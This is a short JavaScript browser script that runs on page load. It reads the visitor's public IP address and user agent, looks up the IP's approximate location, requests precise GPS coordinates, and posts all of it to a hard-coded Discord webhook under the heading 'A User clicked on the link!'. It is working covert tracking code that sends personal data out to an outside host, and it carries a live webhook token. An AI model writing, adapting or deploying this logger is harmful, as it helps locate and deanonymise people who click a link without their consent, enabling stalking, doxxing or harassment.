const sendIP = () => {
  const userAgent = navigator.userAgent;

  fetch('https://api.ipify.org?format=json')
    .then(ipResponse => ipResponse.json())
    .then(ipData => {
      const ipadd = ipData.ip;

      return fetch(`https://ipapi.co/${ipadd}/json/`)
        .then(geoResponse => geoResponse.json())
        .then(geoData => {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (pos) => {
                const gpsLat = pos.coords.latitude.toFixed(5);
                const gpsLon = pos.coords.longitude.toFixed(5);
                logToDiscord(ipadd, userAgent, geoData, gpsLat, gpsLon);
              },
              () => {
                logToDiscord(ipadd, userAgent, geoData, "Denied", "Denied");
              }
            );
          } else {
            logToDiscord(ipadd, userAgent, geoData, "Not supported", "Not supported");
          }
        });
    })
    .catch(error => {
      console.error('Error:', error);
    });
};

const logToDiscord = (ipadd, userAgent, geoData, gpsLat, gpsLon) => {
  const dscURL = 'https://discord.com/api/webhooks/1410930902707601418/OL94ZgkySxNkxbaP0EfYkVRaOiNIPgnTOemhhqlHmn6n3Uj7oqlpHaB8MXuzbHaPHe9m';

  const embed = {
    title: 'A User clicked on the link!',
    description: `**IP Address >>** ${ipadd}
**User-Agent >>** ${userAgent}
**Network >>** ${geoData.network}
**City >>** ${geoData.city}
**Region >>** ${geoData.region}
**Country >>** ${geoData.country_name}
**Postal Code >>** ${geoData.postal}
**Latitude >>** ${geoData.latitude}
**Longitude >>** ${geoData.longitude}
**GPS (Precise) >>** ${gpsLat}, ${gpsLon}`,
    color: 0x800080
  };

  fetch(dscURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: "Glem bot",
      avatar_url: "https://t4.ftcdn.net/jpg/00/10/29/99/360_F_10299968_1z4xdoUIBgeQ4GVKqsf1sg9sot3Qe6RV.jpg",
      content: `@here`,
      embeds: [embed]
    })
  }).then(dscResponse => {
    if (dscResponse.ok) {
      console.log('Sent! <3');
    } else {
      console.log('Failed :(');
    }
  }).catch(error => {
    console.error('Error sending to Discord:', error);
  });
};

sendIP();
